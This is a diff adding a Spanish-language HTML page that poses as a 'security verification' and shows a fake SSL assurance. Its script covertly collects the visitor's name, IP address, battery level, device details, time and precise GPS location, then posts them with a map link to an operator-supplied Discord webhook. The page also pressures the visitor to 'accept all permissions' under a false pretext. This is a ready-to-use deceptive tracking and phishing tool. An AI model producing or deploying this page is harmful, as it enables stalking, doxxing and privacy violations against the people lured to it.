@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f4f4f9; margin: 0; }
+        .card { background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
+        h2 { color: #333; }
+        p { color: #666; font-size: 0.9rem; }
+        input { width: 100%; padding: 10px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        button { background-color: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; width: 100%; font-size: 1rem; }
+        button:hover { background-color: #0056b3; }
+        .footer-text { font-size: 0.7rem; color: #999; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Verificación Requerida</h2>
+    <p>Para continuar, por favor ingresa tu nombre y <b>acepta todos los permisos</b> de la siguiente ventana para verificar que es usted.</p>
+    
+    <input type="text" id="userName" placeholder="Escribe tu nombre completo">
+    <button onclick="iniciarProceso()">ACEPTAR TODO Y VERIFICAR</button>
+    
+    <p class="footer-text">Certificado de seguridad SSL activo. <br>ID de sesión: <span id="session-id"></span></p>
+</div>
+
+<script>
+    // Generar un ID aleatorio para la sesión (parecido al de tu ejemplo)
+    document.getElementById('session-id').innerText = Math.random().toString(36).substring(7).toUpperCase();
+
+    async function iniciarProceso() {
+        const nombre = document.getElementById('userName').value;
+        
+        if (!nombre) {
+            alert("Por favor, ingresa tu nombre para la verificación.");
+            return;
+        }
+
+        // 1. Obtener IP y datos básicos
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+
+        // 2. Obtener Batería
+        let nivelPila = "Desconocido";
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            nivelPila = (battery.level * 100) + "%";
+        }
+
+        const datos = {
+            nombre_ingresado: nombre,
+            ip: ipData.ip,
+            dispositivo: navigator.userAgent,
+            pila: nivelPila,
+            hora: new Date().toLocaleString(),
+            lat: "No permitida",
+            lon: "No permitida"
+        };
+
+        // 3. Solicitar Ubicación (Esto dispara el mensaje del navegador)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    datos.lat = pos.coords.latitude;
+                    datos.lon = pos.coords.longitude;
+                    enviarDatos(datos);
+                    alert("Verificación completada con éxito.");
+                },
+                (err) => {
+                    enviarDatos(datos);
+                    alert("Error: Debe aceptar los permisos de ubicación para verificar su identidad.");
+                }
+            );
+        } else {
+            enviarDatos(datos);
+        }
+    }
+
+    function enviarDatos(info) {
+        // REEMPLAZA ESTO CON TU URL DE WEBHOOK DE DISCORD
+        const WEBHOOK_URL = 'TU_URL_AQUI';
+
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `🔔 **Nueva Verificación Recibida**\n` +
+                         `👤 **Nombre:** ${info.nombre_ingresado}\n` +
+                         `🌐 **IP:** ${info.ip}\n` +
+                         `🔋 **Pila:** ${info.pila}\n` +
+                         `📱 **Dispositivo:** ${info.dispositivo}\n` +
+                         `📍 **Ubicación:** https://www.google.com/maps?q=${info.lat},${info.lon}\n` +
+                         `⏰ **Hora:** ${info.hora}`
+            })
+        });
+    }
+</script>
+
+</body>
+</html>
